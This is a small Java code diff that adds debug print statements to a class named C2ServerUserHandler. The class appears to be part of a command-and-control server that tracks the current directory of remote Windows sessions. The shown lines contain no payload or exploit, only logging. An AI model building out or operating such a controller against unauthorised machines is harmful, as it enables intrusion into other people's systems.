@@ -286,6 +286,9 @@ public class C2ServerUserHandler implements Runnable{
                     readMessages.add(message.toString());
                 }
 
+                System.out.println("readMessages var: ");
+                System.out.println(readMessages.toString());
+
                 for(int i = messages.length - 1; i > 0; i--){
                     if(messages[i].toString().contains("C:\\")){
                         currentDirectory = messages[i].toString().trim().split(" ")[1];
@@ -332,6 +335,8 @@ public class C2ServerUserHandler implements Runnable{
 
                         // Get all messages
                         messages = messageQueue.toArray();
+                        System.out.println("readMessages var: ");
+                        System.out.println(readMessages.toString());
 
                         // Store all of the messages just received in a new temp list
                         ArrayList<String> tempReadMessagesList = new ArrayList<>();
